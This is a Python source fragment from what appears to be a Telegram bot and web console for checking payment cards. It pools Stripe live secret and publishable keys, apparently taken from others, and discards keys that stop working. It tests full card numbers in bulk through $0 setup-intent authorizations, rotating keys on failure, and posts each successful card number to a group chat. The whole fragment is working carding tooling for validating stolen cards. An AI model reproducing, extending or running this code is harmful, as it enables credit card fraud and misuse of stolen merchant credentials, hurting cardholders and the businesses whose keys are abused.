    @app_instance.on_message(filters.command("mask"))
    async def cmd_mask(client, message):
        # Usage: /mask GROUP — then include keys in same message or reply/document
        parts = (message.text or "").split(maxsplit=1)
        if len(parts) < 2:
            return await message.reply_text("📌 Usage: `/mask GROUP` then attach or reply with text containing SK/PK pairs")
        group = parts[1].strip()
        text = await _read_text_from_message(message)
        sks = SK_RE.findall(text)
        pks = PK_RE.findall(text)
        if not sks or not pks:
            return await message.reply_text("❌ No keys found. Expect lines containing sk_live_... and pk_live_...")
        # naive pairing: zip by index up to min length
        n = min(len(sks), len(pks))
        pairs = list(zip(sks[:n], pks[:n]))
        if not pairs:
            return await message.reply_text("❌ No valid SK/PK pairs found.")
        data = load_keys()
        if group not in data:
            data[group] = []
        before = len(data[group])
        # Dedup within group
        existing = {(e.get('sk'), e.get('pk')) for e in data[group]}
        added = 0
        for sk, pk in pairs:
            if (sk, pk) not in existing:
                data[group].append({"sk": sk, "pk": pk})
                existing.add((sk, pk))
                added += 1
        save_keys(data)
        await message.reply_text(f"✅ Added {added} key pair(s) to `{group}`. Total: {len(data[group])}")

        if is_auto_validate_enabled():
            schedule_key_health_scan(delay=5.0)

    @app_instance.on_message(filters.command("healthscan"))
    @admin_only
    async def cmd_healthscan(client, message: Message):
        parts = (message.text or "").split()
        if len(parts) < 2:
            state_text = "ENABLED" if is_auto_validate_enabled() else "DISABLED"
            return await message.reply_text(
                "🔍 Stripe key health scan is currently {}.\n\n"
                "Usage:\n"
                "• /healthscan on\n"
                "• /healthscan off\n"
                "• /healthscan run".format(state_text)
            )
        action = parts[1].lower()
        if action in {"on", "enable", "enabled"}:
            changed = set_auto_validate_enabled(True)
            if changed:
                await message.reply_text("✅ Stripe key health scans enabled.")
            else:
                await message.reply_text("ℹ️ Stripe key health scans are already enabled.")
        elif action in {"off", "disable", "disabled"}:
            changed = set_auto_validate_enabled(False)
            if changed:
                await message.reply_text("⛔ Stripe key health scans disabled.")
            else:
                await message.reply_text("ℹ️ Stripe key health scans are already disabled.")
        elif action in {"run", "now", "scan"}:
            schedule_key_health_scan(delay=0.1, force=True)
            note = " (auto validation is currently disabled)" if not is_auto_validate_enabled() else ""
            await message.reply_text(f"⏱ Triggered a health scan{note}.")
        else:
            await message.reply_text("Usage: /healthscan [on|off|run]")


# --------- API helpers for web console ----------
async def _auth_check_card_api(card_data: str, group: Optional[str]) -> Dict[str, Any]:
    local_keys = list(_resolve_group_keys(group or ""))
    if not local_keys:
        return {
            "card": card_data,
            "status": "error",
            "message": "no_keys",
            "mode": "auth",
            "card_masked": mask_card(card_data),
        }
    tried: set[str] = set()
    while True:
        candidates = [p for p in local_keys if (p.get("sk") or p.get("secret_key")) not in tried]
        if not candidates:
            return {
                "card": card_data,
                "status": "error",
                "message": "no_valid_keys",
                "mode": "auth",
                "card_masked": mask_card(card_data),
            }
        pair = random.choice(candidates)
        secret_key = pair.get("sk") or pair.get("secret_key")
        publishable_key = pair.get("pk") or pair.get("publishable_key")
        tried.add(secret_key)

        src = await create_source_with_pk(publishable_key, card_data)
        if not src or "id" not in src:
            decline = src.get("error", "Unknown") if isinstance(src, dict) else "Unknown"
            advise = src.get("advise", "No advice") if isinstance(src, dict) else "No advice"
            reason = src.get("error") if isinstance(src, dict) else None
            if reason in {"api_key_expired", "testmode_charges_only"}:
                await _remove_bad_key(secret_key, group=group, reason=reason)
                local_keys = list(_resolve_group_keys(group or ""))
                tried.discard(secret_key)
                continue
            return {
                "card": card_data,
                "status": "declined",
                "message": decline,
                "advice": advise,
                "mode": "auth",
                "card_masked": mask_card(card_data),
            }

        source_id = src["id"]
        cust = await create_customer_with_source(secret_key, source_id)
        if not cust or "id" not in cust:
            decline = cust.get("error", "Unknown") if isinstance(cust, dict) else "Unknown"
            advise = cust.get("advise", "No advice") if isinstance(cust, dict) else "No advice"
            reason = cust.get("error") if isinstance(cust, dict) else None
            if reason in {"api_key_expired", "testmode_charges_only"}:
                await _remove_bad_key(secret_key, group=group, reason=reason)
                local_keys = list(_resolve_group_keys(group or ""))
                tried.discard(secret_key)
                continue
            return {
                "card": card_data,
                "status": "declined",
                "message": decline,
                "advice": advise,
                "mode": "auth",
                "card_masked": mask_card(card_data),
            }

        customer_id = cust["id"]
        si = await create_and_confirm_setup_intent_with_source(secret_key, customer_id, source_id)
        if isinstance(si, dict) and si.get("status") == "succeeded":
            try:
                await notify_group(f"✅ AUTH | `{card_data}` | Gate: Authorization SI $0 (web)")
            except Exception:
                pass
            return {
                "card": card_data,
                "status": "success",
                "message": "authorized",
                "mode": "auth",
                "card_masked": mask_card(card_data),
            }
        decline = si.get("error", si.get("status", "Unknown")) if isinstance(si, dict) else "Unknown"
        advise = si.get("advise", "No advice") if isinstance(si, dict) else "No advice"
        reason = si.get("error") if isinstance(si, dict) else None
        if reason in {"api_key_expired", "testmode_charges_only"}:
            await _remove_bad_key(secret_key, group=group, reason=reason)
            local_keys = list(_resolve_group_keys(group or ""))
            tried.discard(secret_key)
            continue
        return {
            "card": card_data,
            "status": "declined",
            "message": decline,
            "advice": advise,
            "mode": "auth",
            "card_masked": mask_card(card_data),
        }


async def api_check_cards(cards: List[str], group: Optional[str], mode: str = "auth") -> List[Dict[str, Any]]:
    mode = (mode or "auth").lower()
    results: List[Dict[str, Any]] = []
    if mode == "pmi":
        group_keys = _resolve_group_keys(group or "")
        if not group_keys:
            return [
                {"card": card, "status": "error", "message": "no_keys", "mode": "pmi"}
                for card in cards
            ]
        for card in cards:
            res_card, res_msg = await run_card_pmi(card, group_keys, group)
            status = "success" if res_msg.startswith("✅") else "declined"
            reason = res_msg.split("|", 1)[1].strip() if "|" in res_msg else res_msg
            results.append({
                "card": res_card,
                "status": status,
                "message": reason,
                "mode": "pmi",
                "card_masked": mask_card(res_card),
            })
        return results

    for card in cards:
        results.append(await _auth_check_card_api(card, group))
    return results


# auto-register when imported
register_stripe_handlers(app)